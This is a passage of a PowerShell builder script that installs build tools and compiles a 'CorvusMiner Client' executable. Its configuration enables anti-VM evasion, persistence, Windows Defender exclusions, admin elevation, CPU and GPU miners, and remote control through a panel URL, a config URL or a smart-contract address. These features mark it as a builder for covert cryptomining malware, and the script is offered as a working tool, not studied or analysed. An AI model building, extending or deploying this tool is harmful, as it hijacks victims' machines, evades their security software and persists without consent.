        $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')
        if (-not $isAdmin) {
            Write-LogWarning "Running without admin rights. Some features (like Chocolatey install) may fail."
            Write-LogWarning "It's recommended to run this script as Administrator."
            Start-Sleep -Seconds 2
        }
        
        # Install dependencies
        Write-Header "Checking Dependencies"
        Install-ChocoIfMissing
        Ensure-CMake
        Ensure-MinGW
        
        # Get build configuration
        $scriptDir = $PSScriptRoot
        if ([string]::IsNullOrEmpty($scriptDir)) {
            $scriptDir = (Get-Location).Path
        }
        $clientDir = Join-Path $scriptDir "Client"
        
        # If Client directory not found in script directory, try parent directory
        if (-not (Test-Path $clientDir)) {
            $scriptDir = Split-Path -Parent $scriptDir
            $clientDir = Join-Path $scriptDir "Client"
        }
        
        if (-not (Test-Path $clientDir)) {
            throw "Client directory not found at: $clientDir`nTried: $(Join-Path $scriptDir "Client")"
        }
        
        # Get build configuration - use parameters if provided, otherwise ask interactively
        if ($panel_url -or $config_url -or $smart_contract) {
            # Use provided parameters
            # Determine config method: if config_url provided, use GET; otherwise use POST (panel)
            $useGetConfigMethod = -not [string]::IsNullOrEmpty($config_url) -and [string]::IsNullOrEmpty($panel_url) -and -not $smart_contract

            # Auto-detect embedded_config.json next to the script
            $embeddedConfigPath = Join-Path $scriptDir "embedded_config.json"
            $hasEmbeddedConfig = Test-Path $embeddedConfigPath

            $config = @{
                'UseGetConfig' = $useGetConfigMethod
                'PanelURL' = $panel_url
                'ConfigURL' = $config_url
                'SmartContract' = $smart_contract
                'ContractAddress' = $contract_address
                'AntiVM' = $antivm
                'Persistence' = $persistence
                'DebugConsole' = $debug_console
                'AdminManifest' = $admin_manifest
                'DefenderExclusion' = $defender_exclusion
                'EnableCPUMiner' = $cpu_miner
                'EnableGPUMiner' = $gpu_miner
                'RemoteMiners' = $remote_miners
                'RequireAdmin' = $admin_manifest
                'EnableEmbeddedConfig' = $hasEmbeddedConfig
                'EmbeddedConfigPath' = if ($hasEmbeddedConfig) { $embeddedConfigPath } else { "" }
            }
            if ($hasEmbeddedConfig) {
                Write-LogInfo "Found embedded_config.json - will embed in build"
            }
            Write-LogSuccess "Using provided configuration (non-interactive mode)"
        } else {
            # Interactive mode
            $config = Get-BuildConfiguration $clientDir
        }
        
        # Execute build
        Write-Header "Building CorvusMiner Client"
        Invoke-CMakeBuild $clientDir $config
        
        Write-Header "Build Complete"
        Write-LogSuccess "CorvusMiner Client built successfully!"
        $binaryPath = Join-Path $clientDir "build\corvus.exe"
        Write-Host "Binary location: $binaryPath" -ForegroundColor Green
        Write-Host ""
    }
    catch {
        Write-LogError $_
        if (-not $panel_config) {
            Write-Host ""
            Read-Host "Press Enter to exit"
        }
        exit 1
    }
}

# Run the builder
Main
